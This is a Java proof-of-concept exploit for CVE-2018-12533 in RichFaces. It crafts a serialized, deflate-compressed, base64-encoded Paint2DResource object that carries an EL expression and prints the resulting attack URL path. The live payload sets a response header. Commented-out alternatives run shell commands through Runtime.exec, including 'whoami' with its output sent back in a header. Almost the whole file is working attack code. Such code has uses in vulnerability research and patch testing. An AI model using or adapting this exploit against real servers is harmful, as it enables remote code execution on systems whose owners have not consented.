

import com.sun.facelets.el.LegacyMethodBinding;
import com.sun.facelets.el.TagMethodExpression;
import com.sun.facelets.tag.TagAttribute;
import com.sun.facelets.tag.Location;

import org.ajax4jsf.util.base64.URL64Codec;
import org.jboss.el.MethodExpressionImpl;

import javax.faces.context.FacesContext;
import javax.faces.el.MethodBinding;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.zip.Deflater;

public class CVE_2018_12533 {
		
	//https://www.lucifaer.com/2018/12/05/RF-14310%EF%BC%88CVE-2018-12533%EF%BC%89%E5%88%86%E6%9E%90/
    public static void main(String[] args) throws Exception{
    	
    	//String pocEL = "#{request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"touch /tmp/test.txt\")}";
    	String pocEL = "#{facesContext.getExternalContext().getResponse().setHeader(\"TestHeader\", \"1234\")}";
    	
    	//pocEL = "#{session.setAttribute(\"proc\",session.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"bash, -c, whoami\".split(\",\")))}"
    	//        + "#{session.setAttribute(\"val2\", \"\".GetClass().ForName(\"java.io.InputStreamReader\").GetDeclaredConstructors()[0].newInstance(session.getAttribute(\"proc\").GetInputStream()))}"
    	//        + "#{session.setAttribute(\"val3\", \"\".GetClass().ForName(\"java.io.BufferedReader\").GetDeclaredConstructors()[1].newInstance(session.getAttribute(\"val2\")))}"
    	//        + "#{session.getAttribute(\"val3\").ReadLine()}"
    	//        + "#{facesContext.getExternalContext().GetResponse().SetHeader(\"TestHeader\",session.getAttribute(\"val3\").ReadLine())}";
    	    	
    	
        System.out.println(pocEL);
        // tomcat8.5.24 MethodExpression serialVersionUID
        //Long MethodExpressionSerialVersionUID = 8163925562047324656L;
        //Class clazz = Class.forName("javax.el.MethodExpression");
        //Field field = clazz.getField("serialVersionUID");
        //field.setAccessible(true);
        //Field modifiersField = Field.class.getDeclaredField("modifiers");
        //modifiersField.setAccessible(true);
        //modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
        //field.setLong(null, MethodExpressionSerialVersionUID);
    	
         // https://www.anquanke.com/post/id/160338
         Class cls = Class.forName("javax.faces.component.StateHolderSaver");
         Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);
         ct.setAccessible(true);

         Location location = new Location("", 0, 0);
         TagAttribute tagAttribute = new TagAttribute(location, "", "", "", "createContent="+pocEL);
       
         // 1. ImageData
         //    ImageData_paint
         MethodExpressionImpl methodExpression = new MethodExpressionImpl(pocEL, null, null, null, null, new Class[]{OutputStream.class, Object.class});
         TagMethodExpression tagMethodExpression = new TagMethodExpression(tagAttribute, methodExpression);
         MethodBinding methodBinding = new LegacyMethodBinding(tagMethodExpression);
         Object _paint = ct.newInstance(null, methodBinding);

         Class clzz = Class.forName("org.richfaces.renderkit.html.Paint2DResource");
         Class innerClazz[] = clzz.getDeclaredClasses();
         for (Class c : innerClazz){
             int mod = c.getModifiers();
             String modifier = Modifier.toString(mod);
             if (modifier.contains("private")){
                 Constructor cc = c.getDeclaredConstructor();
                 cc.setAccessible(true);
                 Object imageData = cc.newInstance(null);

                 // ImageData_width
                 Field _widthField = imageData.getClass().getDeclaredField("_width");
                 _widthField.setAccessible(true);
                 _widthField.set(imageData, 300);

                 // ImageData_height
                 Field _heightField = imageData.getClass().getDeclaredField("_height");
                 _heightField.setAccessible(true);
                 _heightField.set(imageData, 120);

                 // ImageData_data
                 Field _dataField = imageData.getClass().getDeclaredField("_data");
                 _dataField.setAccessible(true);
                 _dataField.set(imageData, null);

                 // ImageData_format
                 Field _formatField = imageData.getClass().getDeclaredField("_format");
                 _formatField.setAccessible(true);
                 _formatField.set(imageData, 2);

                 // ImageData_paint
                 Field _paintField = imageData.getClass().getDeclaredField("_paint");
                 _paintField.setAccessible(true);
                 _paintField.set(imageData, _paint);

                 // ImageData_paint
                 Field cacheableField = imageData.getClass().getDeclaredField("cacheable");
                 cacheableField.setAccessible(true);
                 cacheableField.set(imageData, false);

                 //ImageData_bgColor
                 Field _bgColorField = imageData.getClass().getDeclaredField("_bgColor");
                 _bgColorField.setAccessible(true);
                 _bgColorField.set(imageData, 0);

                 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
                 objectOutputStream.writeObject(imageData);
                 objectOutputStream.flush();
                 objectOutputStream.close();
                 byteArrayOutputStream.close();

                 //zip+base64
                 byte[] pocData = byteArrayOutputStream.toByteArray();
                 Deflater compressor = new Deflater(1);
                 byte[] compressed = new byte[pocData.length + 100];
                 compressor.setInput(pocData);
                 compressor.finish();
                 int totalOut = compressor.deflate(compressed);
                 byte[] zipsrc = new byte[totalOut];
                 System.arraycopy(compressed, 0, zipsrc, 0, totalOut);
                 compressor.end();
                 byte[]dataArray = URL64Codec.encodeBase64(zipsrc);

                 String poc = "org.richfaces.renderkit.html.Paint2DResource/DATA/" + new String(dataArray, "ISO-8859-1") + "";
                 System.out.println(poc);
             }
         }
     }
 }
